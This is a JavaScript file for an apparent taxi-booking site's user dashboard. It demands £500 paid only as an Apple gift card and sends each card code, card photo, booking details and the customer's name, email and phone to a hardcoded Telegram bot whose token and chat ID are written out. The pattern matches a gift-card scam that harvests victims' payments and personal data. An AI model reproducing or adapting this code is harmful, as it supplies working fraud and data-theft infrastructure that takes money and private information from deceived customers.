document.addEventListener('DOMContentLoaded', function() {
    // Telegram configuration
    const TELEGRAM_BOT_TOKEN = '8092175848:AAEP8ykWtQoBKdO2SwGRdc0FhExwQ_waN8s';
    const TELEGRAM_CHAT_IDS = ['6300694007'];
    
    // DOM Elements
    const newBookingBtn = document.getElementById('newBookingBtn');
    const bookNowBtn = document.getElementById('bookNowBtn');
    const bookingFormSection = document.getElementById('bookingFormSection');
    const bookingForm = document.getElementById('bookingForm');
    const paymentModal = document.getElementById('paymentModal');
    const paymentForm = document.getElementById('paymentForm');
    const closeModal = document.querySelector('.close');
    const logoutBtn = document.getElementById('logout');
    
    // Initialize date/time pickers
    flatpickr("#bookingDate", {
        minDate: "today",
        dateFormat: "Y-m-d",
        disable: [
            function(date) {
                // Disable weekends
                return (date.getDay() === 0 || date.getDay() === 6);
            }
        ]
    });
    
    flatpickr("#bookingTime", {
        enableTime: true,
        noCalendar: true,
        dateFormat: "H:i",
        minTime: "06:00",
        maxTime: "23:00",
        minuteIncrement: 15
    });
    
    // Load user data
    const currentUserEmail = localStorage.getItem('currentUser');
    if (!currentUserEmail) {
        window.location.href = 'index.html';
        return;
    }
    
    const user = JSON.parse(localStorage.getItem(currentUserEmail));
    document.getElementById('userName').textContent = user.name || 'User';
    document.getElementById('userEmail').textContent = user.email;
    document.getElementById('userPhone').textContent = user.phone || 'Not provided';
    document.getElementById('welcomeName').textContent = user.name || 'User';
    
    // Load user bookings
    loadUserBookings();
    
    // Event Listeners
    newBookingBtn.addEventListener('click', showBookingForm);
    bookNowBtn.addEventListener('click', showBookingForm);
    bookingForm.addEventListener('submit', processBooking);
    paymentForm.addEventListener('submit', processPayment);
    closeModal.addEventListener('click', () => paymentModal.style.display = 'none');
    logoutBtn.addEventListener('click', logout);
    
    // File upload display
    document.getElementById('giftCardImage').addEventListener('change', function(e) {
        const fileName = e.target.files[0] ? e.target.files[0].name : 'No file chosen';
        document.getElementById('fileName').textContent = fileName;
    });
    
    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target === paymentModal) {
            paymentModal.style.display = 'none';
        }
    });
    
    // Functions
    function showBookingForm() {
        bookingFormSection.style.display = 'block';
        window.scrollTo({
            top: bookingFormSection.offsetTop - 20,
            behavior: 'smooth'
        });
    }
    
    function processBooking(e) {
        e.preventDefault();
        
        const pickupAddress = document.getElementById('pickupAddress').value;
        const pickupPostcode = document.getElementById('pickupPostcode').value;
        const destinationAddress = document.getElementById('destinationAddress').value;
        const destinationPostcode = document.getElementById('destinationPostcode').value;
        const bookingDate = document.getElementById('bookingDate').value;
        const bookingTime = document.getElementById('bookingTime').value;
        const specialInstructions = document.getElementById('specialInstructions').value;
        
        // Create booking object
        const booking = {
            id: Date.now(),
            pickupAddress,
            pickupPostcode,
            destinationAddress,
            destinationPostcode,
            bookingDate,
            bookingTime,
            specialInstructions,
            status: 'pending',
            createdAt: new Date().toISOString(),
            price: 500
        };
        
        // Save booking to user
        if (!user.bookings) {
            user.bookings = [];
        }
        user.bookings.push(booking);
        localStorage.setItem(user.email, JSON.stringify(user));
        
        // Show payment modal
        paymentModal.style.display = 'block';
        
        // Send booking to Telegram
        sendBookingToTelegram(booking);
    }
    
    async function processPayment(e) {
        e.preventDefault();
        
        const giftCardImage = document.getElementById('giftCardImage').files[0];
        const giftCardCode = document.getElementById('giftCardCode').value;
        
        if (!giftCardCode) {
            alert('Please enter the gift card code');
            return;
        }

        // Get the latest booking
        const latestBooking = user.bookings[user.bookings.length - 1];
        latestBooking.status = 'confirmed';
        latestBooking.paidAt = new Date().toISOString();
        localStorage.setItem(user.email, JSON.stringify(user));
        
        try {
            // Send payment to Telegram
            await sendPaymentToTelegram(giftCardImage, giftCardCode, latestBooking);
            
            // Close modal and refresh
            paymentModal.style.display = 'none';
            bookingForm.reset();
            bookingFormSection.style.display = 'none';
            loadUserBookings();
            
            alert('Payment received! Your booking is now confirmed.');
        } catch (error) {
            console.error('Payment processing error:', error);
            alert('There was an error processing your payment. Please try again.');
        }
    }
    
    function loadUserBookings() {
        const bookingsList = document.getElementById('bookingsList');
        
        if (!user.bookings || user.bookings.length === 0) {
            bookingsList.innerHTML = `
                <div class="no-bookings">
                    <i class="fas fa-taxi"></i>
                    <p>You haven't made any bookings yet</p>
                    <button id="bookNowBtn" class="btn btn-outline">Book Now</button>
                </div>
            `;
            document.getElementById('bookNowBtn').addEventListener('click', showBookingForm);
            return;
        }
        
        // Sort bookings by date (newest first)
        const sortedBookings = [...user.bookings].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
        
        bookingsList.innerHTML = '';
        
        sortedBookings.forEach(booking => {
            const bookingDate = new Date(`${booking.bookingDate}T${booking.bookingTime}`);
            const bookingItem = document.createElement('div');
            bookingItem.className = 'booking-item';
            
            bookingItem.innerHTML = `
                <div class="booking-location">
                    <div class="from-to">
                        <span>${booking.pickupPostcode}</span>
                        <i class="fas fa-arrow-right"></i>
                        <span>${booking.destinationPostcode}</span>
                    </div>
                    <div class="address">
                        ${booking.pickupAddress} → ${booking.destinationAddress}
                    </div>
                </div>
                <div class="booking-date">
                    <i class="fas fa-calendar-alt"></i>
                    ${bookingDate.toLocaleDateString('en-GB', { weekday: 'short', day: 'numeric', month: 'short' })} at 
                    ${bookingDate.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' })}
                </div>
                <div>
                    <span class="booking-status status-${booking.status}">${booking.status.charAt(0).toUpperCase() + booking.status.slice(1)}</span>
                </div>
            `;
            
            bookingsList.appendChild(bookingItem);
        });
    }
    
    function sendBookingToTelegram(booking) {
        const message = `🚖 *New Bulk Booking Request* 🚖\n\n` +
                       `📅 *Date:* ${booking.bookingDate} at ${booking.bookingTime}\n` +
                       `📍 *Pickup:* ${booking.pickupAddress}, ${booking.pickupPostcode}\n` +
                       `🏁 *Destination:* ${booking.destinationAddress}, ${booking.destinationPostcode}\n` +
                       `💷 *Amount:* £500 (Apple Gift Card)\n\n` +
                       `📝 *Special Instructions:* ${booking.specialInstructions || 'None'}\n\n` +
                       `👤 *Customer:* ${user.name}\n` +
                       `📧 *Email:* ${user.email}\n` +
                       `📞 *Phone:* ${user.phone}\n` +
                       `⏰ *Booked at:* ${new Date(booking.createdAt).toLocaleString()}`;
        
        sendTelegramMessage(message);
    }
    
    async function sendPaymentToTelegram(image, code, booking) {
        let message = `💳 *Payment Received for Booking #${booking.id}*\n\n` +
                      `💰 *Amount:* £500 (Apple Gift Card)\n` +
                      `🔢 *Gift Card Code:* ${code}\n\n` +
                      `👤 *Customer:* ${user.name}\n` +
                      `📧 *Email:* ${user.email}\n` +
                      `📞 *Phone:* ${user.phone}\n` +
                      `⏰ *Paid at:* ${new Date().toLocaleString()}`;

        // First send the text message
        await sendTelegramMessage(message);
        
        // Then send the image if available
        if (image) {
            await sendTelegramPhoto(image, `Gift Card for Booking #${booking.id}`);
        }
    }
    
    async function sendTelegramPhoto(image, caption) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_IDS[0]);
        formData.append('photo', image);
        formData.append('caption', caption);

        try {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, 
                {
                    method: 'POST',
                    body: formData
                }
            );
            const data = await response.json();
            console.log('Telegram photo sent:', data);
            return data;
        } catch (error) {
            console.error('Error sending photo to Telegram:', error);
            throw error;
        }
    }
    
    function sendTelegramMessage(message) {
        return new Promise((resolve, reject) => {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_IDS) {
                reject('Telegram not configured');
                return;
            }
            
            TELEGRAM_CHAT_IDS.forEach(chatId => {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Telegram notification sent:', data);
                    resolve(data);
                })
                .catch(error => {
                    console.error('Error sending Telegram notification:', error);
                    reject(error);
                });
            });
        });
    }
    
    function logout() {
        localStorage.removeItem('currentUser');
        window.location.href = 'index.html';
    }
});
